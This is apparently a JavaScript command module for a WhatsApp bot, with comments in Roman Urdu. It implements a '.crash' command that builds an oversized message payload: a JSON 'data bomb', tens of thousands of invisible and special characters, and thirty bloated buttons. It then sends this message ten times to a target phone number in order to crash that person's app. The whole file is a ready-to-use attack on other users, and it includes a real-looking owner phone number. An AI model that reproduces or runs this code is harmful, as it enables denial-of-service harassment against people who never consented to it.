// Zaroori cheezein import ki ja rahi hain
const { cmd } = require('../command'); // Aapka command handler

// --- Helper Functions (Madadgar Functions) ---

// Number ko saaf format (e.g., 2547...) mein laane ke liye
const normalizeNumber = (number) => {
    return number.replace(/[^0-9]/g, '');
};

// Check karta hai ke number Kenyan format (254xxxxxxxxx) mein hai ya nahi
const isValidPhoneNumber = (number) => {
    const cleaned = number.replace(/[^0-9]/g, '');
    return /^254[0-9]{9}$/.test(cleaned);
};

// Kuch der ke liye rukne wala function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- Crash Message Banane Wala Asal Function ---
async function sendCrashMessage(conn, targetJid) {
    // 1. Data Bomb: Bohat bara JSON data jo app ko process karne mein mushkil dega
    const venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            // Kai layers ka data jo app ke event handlers ko overload karega
            _eventsCount: 999999,
            _maxListeners: 0,
            // etc...
        }
    });

    // 2. Text Bomb: Hazaron invisible characters ki aik lambi string
    const longChar = "\u200E".repeat(1024) + "ꦽ".repeat(80000);

    // 3. Complex Payload: In sab cheezon ko mila kar banaya gaya اصل crash message
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    // Farzi high values daal kar app ko confuse karna
                    unreadCount: 9999,
                    forwardingScore: 7777777,
                    isStatusBroadcast: true,
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    newsletterName: `𝐀𝖑𝖙𝖊𝖗 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝕭𝖊𝖙𝖆 𝖁𝟐 ☠️ ${"ꥈ".repeat(15)}`,
                    accessibilityText: `𝗕𝗘𝗧𝗔 💢 ${"﹏".repeat(2048)}`
                },
                interactiveMessage: {
                    body: {
                        text: longChar // Text Bomb yahan istemal hua
                    },
                    nativeFlowMessage: {
                        // 30 buttons, har ek mein bara data bomb
                        buttons: Array.from({ length: 30 }, () => ({
                            name: "single_select",
                            buttonParamsJson: venomModsData + "\u0003".repeat(2048) // Data Bomb
                        }))
                    }
                }
            }
        }
    };

    // Message bhejna
    await conn.relayMessage(targetJid, message, { participant: { jid: targetJid } });
}


// --- Command Ki Asal Logic ---
cmd({
    pattern: "crash",
    alias: ["beta-crash", "alter"],
    desc: "Sends a multi-payload crash message to a target.",
    category: "owner",
    react: "☠️",
    filename: __filename
},
async (conn, mek, m, { from, args, q, reply }) => {
    try {
        const ownerNumber = "923151105391";

        // --- Step 1: Owner Check ---
        const senderNumber = normalizeNumber(m.sender.split('@')[0]);
        if (senderNumber !== ownerNumber) {
            return reply(`😤 YOU VILE IMPOSTOR! Trying to wield ${ownerNumber}’s destructive power? Begone! 🚫`);
        }

        // --- Step 2: Target Validation ---
        if (!q) {
            return reply(`😡 YOU FOOL! Provide a target number! Format: .crash 254xxx`);
        }

        // Target ko mention, reply ya number se hasil karna
        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q;
        let targetNumber = target.includes('@') ? target.split('@')[0] : target;
        
        if (!isValidPhoneNumber(targetNumber)) {
            return reply(`😤 IDIOT! Invalid target number! Use a valid Kenyan number: .crash 254xxxxxxxxx or tag/quote a user!`);
        }
        
        const targetJid = `${normalizeNumber(targetNumber)}@s.whatsapp.net`;
        
        await conn.sendMessage(from, { react: { text: '🔍', key: m.key } }); // Processing reaction

        // --- Step 3: Attack Loop ---
        // Yeh loop 5 baar chalta hai, aur har baar 2 crash messages bhejta hai (Total 10 messages)
        for (let i = 0; i < 5; i++) {
            await sendCrashMessage(conn, targetJid);
            await sleep(5000); // 5 second ka waqfa
            await sendCrashMessage(conn, targetJid);
        }

        await conn.sendMessage(from, { react: { text: '✅', key: m.key } }); // Success reaction

        // --- Step 4: Confirmation ---
        const successMessage = `◈ *Information Attack* ◈\n❒ Target: ${targetNumber}\n❒ Status: Success\n❒ Powered by Qadeer_Khan`;
        await reply(successMessage);

    } catch (e) {
        console.error("Error in Crash command:", e);
        reply(`😤 OUTRAGEOUS! Attack failed: ${e.message}!`);
    }
});
